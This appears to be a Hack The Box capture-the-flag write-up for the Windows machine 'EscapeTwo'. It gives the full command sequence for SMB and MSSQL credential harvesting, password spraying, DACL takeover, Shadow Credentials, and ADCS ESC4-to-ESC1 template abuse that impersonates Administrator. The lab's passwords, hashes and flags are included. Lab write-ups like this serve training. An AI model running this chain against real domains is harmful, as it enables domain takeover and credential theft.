# CTF: EscapeTwo (HTB)

## Metadata

- **Target IP:** 10.129.232.128
    
- **OS:** Windows
    
- **Difficulty:** Medium
    
- **Date:** 2025-12-21
    
- **Tags:** #HTB #Windows #ADCS #MSSQL #ESC4 #ESC1 #ShadowCredentials
    

---

## Reconnaissance

### Port Scanning

The Nmap scan revealed a standard Domain Controller profile with **MSSQL (1433)** and **WinRM (5985)** open.

Bash

```
nmap -Pn $target -sV -sC -oN nmap_sVsC.txt
```

**Key Ports:**

- **88/tcp**: Kerberos
    
- **389/tcp**: LDAP
    
- **445/tcp**: SMB
    
- **1433/tcp**: MSSQL
    
- **5985/tcp**: WinRM
    

### SMB Enumeration

Using the provided credentials (`rose / KxEPkKe6R8su`), I enumerated the available shares.

Bash

```
netexec smb $target -u rose -p 'KxEPkKe6R8su' --shares
```

The share `Accounting Department` was accessible and contained two Excel files: `accounting_2024.xlsx` and `accounts.xlsx`.

---

## Credential Cracking

### Extracting Leaked Credentials

Excel files (`.xlsx`) are essentially Zip archives. By unzipping them and searching the XML content, I found credentials stored in `xl/sharedStrings.xml`.

Bash

```
grep -ri 'user' ./unzipped_excel/
```

**Leaked Credentials found:**

- `angela / 0fwz7Q4mSpurIt99`
    
- `oscar / 86LxLBMgEWaKUnBG`
    
- `kevin / Md9Wlq1E5bZnVDVo`
    
- **`sa / MSSQLP@ssw0rd!`** (Targeted for MSSQL access)
    

---

## Foothold

### MSSQL to Service Account

Using the `sa` credentials, I gained command execution on the SQL server.

Bash

```
netexec mssql $target -u sa -p 'MSSQLP@ssw0rd!' --local-auth -x whoami
# Result: sequel\sql_svc
```

While investigating the filesystem, I found the SQL installation configuration file:

`C:\SQL2019\expressadv_enu\sql-Configuration.INI`

This file contained the plaintext password for the service account:

- **Account:** `SEQUEL\sql_svc`
    
- **Password:** `WqSZAF6CysDQbGb3`
    

---

## Lateral Movement

### Credential Spraying

I sprayed the `sql_svc` password against other known users and found a match for the user **ryan**.

Bash

```
netexec smb $target -u users.txt -p 'WqSZAF6CysDQbGb3'
# Result: [+] sequel.htb\ryan:WqSZAF6CysDQbGb3
```

### Initial Shell

Using **Evil-WinRM**, I logged in as `ryan` and collected the user flag.

Bash

```
evil-winrm -u ryan -p WqSZAF6CysDQbGb3 -i $target
```

---

## Privilege Escalation

### ADCS Exploitation (ESC4 & ESC1)

Enumeration showed that user `ryan` had dangerous permissions over the `ca_svc` (Certificate Authority Service) account.

#### 1. Take Control of ca_svc

I used **impacket-owneredit** and **impacket-dacledit** to take ownership and grant `ryan` Full Control over the `ca_svc` object.

Bash

```
impacket-owneredit -action write -new-owner ryan -target ca_svc sequel.htb/ryan:WqSZAF6CysDQbGb3
impacket-dacledit -action write -rights 'FullControl' -principal 'ryan' -target ca_svc sequel.htb/ryan:WqSZAF6CysDQbGb3
```

#### 2. Retrieve ca_svc Hash

With control over the account, I used a **Shadow Credentials** attack to retrieve the NT hash for `ca_svc`.

Bash

```
certipy-ad shadow auto -u ryan@sequel.htb -p WqSZAF6CysDQbGb3 -account ca_svc -dc-ip $target
# Result: NT hash for 'ca_svc': 3b181b914e7a9d5508ea1e20bc2b7fce
```

#### 3. Template Manipulation (ESC4 $\rightarrow$ ESC1)

Enumeration as `ca_svc` revealed the `DunderMifflinAuthentication` template was vulnerable to **ESC4**. I modified it to become an **ESC1** vulnerability (allowing the enrollee to supply a Subject Alternative Name).

Bash

```
certipy-ad template -u ca_svc@sequel.htb -hashes [HASH] -template DunderMifflinAuthentication -write-default-configuration
```

#### 4. Impersonating Administrator

I requested a certificate for the **Administrator** user using the newly vulnerable template.

Bash

```
certipy-ad req -u ca_svc@sequel.htb -hashes [HASH] -ca sequel-DC01-CA -dc-ip $target -template DunderMifflinAuthentication -upn administrator@sequel.htb
```

#### 5. Authenticating as Admin

I used the generated `.pfx` to authenticate and retrieve the Administrator's NT hash, then used **psexec** to gain a SYSTEM shell.

Bash

```
certipy-ad auth -dc-ip $target -pfx administrator.pfx -username administrator -domain sequel.htb
impacket-psexec sequel.htb/administrator@$target -hashes :7a8d4e04986afa8ed4060f75e5a0b3ff
```

---

## Flags

- **User (ryan):** `9db65bb5b1761a409d9b127abb237144`
    
- **Root (Administrator):** `ebdd26bc6746fd8082e68029383a7e4b`
